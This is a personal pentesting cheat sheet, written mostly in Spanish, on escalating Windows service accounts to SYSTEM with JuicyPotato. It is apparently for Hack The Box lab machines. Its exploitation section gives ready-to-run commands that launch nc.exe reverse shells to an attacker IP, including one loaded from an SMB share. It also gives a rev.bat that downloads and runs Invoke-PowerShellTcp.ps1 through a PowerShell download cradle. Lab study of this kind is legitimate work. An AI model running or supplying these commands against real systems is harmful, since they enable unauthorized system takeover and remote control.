
## DESCRIPTION

A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM.

¿Que necesitamos?

![[Pasted image 20230221115231.png]]

Versiones afectadas: Server 2008R2, Server 2012, Server 2012 R2, Server 2016

#### Mas información
* https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato

## EXPLOITATION

### OPTION 1: 

```
JuicyPotato.exe -l 1337 -c "{<<CSLID>>}" -p c:\windows\system32\cmd.exe -a "/c nc.exe -e cmd.exe <<IP DE ESCUCHA>> <<PUERTO ESCUCHA>>" -t *

# Ejemplo usando SMB
\\10.10.14.16\smbJuicyPotato -l 1337 -c "{96F27804-F44D-43BE-8B5F-630A21B7F83D}" -p c:\windows\system32\cmd.exe -a "/c \\10.10.14.16\smb\nc.exe -e cmd.exe 10.10.14.16 4444" -t *
```

![[Pasted image 20230221120048.png]]

**!!NOTA IMPORTANTE!!** 
* Cambiar el CSLID en funcion del Sistema Operativo

### OPTION 2:  EN WINDOWS 10  PUEDE HABER PROBLEMAS CON EL COMANDO  

LO MEJOR ES DESCARGAR NC EN LOCAL O BIEN UTILIZAR UNA LLAMADA (.BAT) A INVOKE-REVERSHEL.PS1

```
# Ejemplo con nc en loal
\10.10.14.16\smb\JuicyPotato.exe -l 9001 -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}" -p C:\users\Destitute\appdata\local\temp\nc.exe  -a " -e cmd.exe 10.10.14.16 5555" -t *

# Ejemplo con rev.bar
 \\10.10.14.16\smb\JuicyPotato.exe -l 9001 -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}" -p C:\users\Destitute\appdata\local\temp\rev.bat -t *
```

Donde rev.bat contiene `powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.15/Invoke-PowerShellTcp.ps1')` es decir llamas a este ejecutable que se descarga Invoke-PowershellTcp.

## MACHINES

* Hack The Box: Bounty, Conceal
